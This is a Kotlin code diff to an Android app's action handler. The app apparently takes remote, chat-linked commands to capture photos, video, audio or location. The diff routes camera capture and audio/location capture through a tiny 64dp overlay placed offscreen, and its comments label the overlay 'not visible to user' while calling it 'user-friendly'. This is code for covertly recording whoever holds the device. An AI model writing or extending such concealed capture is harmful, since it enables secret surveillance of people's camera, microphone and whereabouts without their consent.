@@ -53,12 +53,29 @@ object ActionHandlers {
                     )
                     return
                 }
-                // Start the service and let it handle overlay creation and management for camera/photo/video
-                startCameraActionInvoke(context, type, camera, flash, quality, duration, chatId)
+                // Use user-friendly overlay: tiny and offscreen by default
+                OverlayHelper.showSurfaceOverlay(
+                    context,
+                    callback = { surfaceHolder, overlayView ->
+                        startCameraActionInvoke(
+                            context,
+                            type,
+                            camera,
+                            flash,
+                            quality,
+                            duration,
+                            chatId,
+                            surfaceHolder,
+                            overlayView
+                        )
+                    },
+                    overlaySizeDp = 64, // tiny preview
+                    offScreen = true // not visible to user
+                )
                 return
             } else {
                 if (OverlayHelper.hasOverlayPermission(context)) {
-                    OverlayHelper.showViewOverlay(context) { overlayView ->
+                    OverlayHelper.showViewOverlay(context, callback = { overlayView ->
                         if (overlayView == null) {
                             Log.e("ActionHandlers", "Audio/location overlay creation failed.")
                             return@showViewOverlay
@@ -67,7 +84,7 @@ object ActionHandlers {
                             OverlayHelper.removeOverlay(context, overlayView)
                             startOtherActionInvoke(context, type, duration, chatId)
                         }, 400)
-                    }
+                    }, overlaySizeDp = 64, offScreen = true)
                     return
                 }
             }
@@ -83,7 +100,9 @@ object ActionHandlers {
         flash: String?,
         quality: String?,
         duration: String?,
-        chatId: String?
+        chatId: String?,
+        surfaceHolder: SurfaceHolder? = null,
+        overlayView: View? = null
     ) {
         val cam = camera ?: "front"
         val flashEnabled = flash == "true"
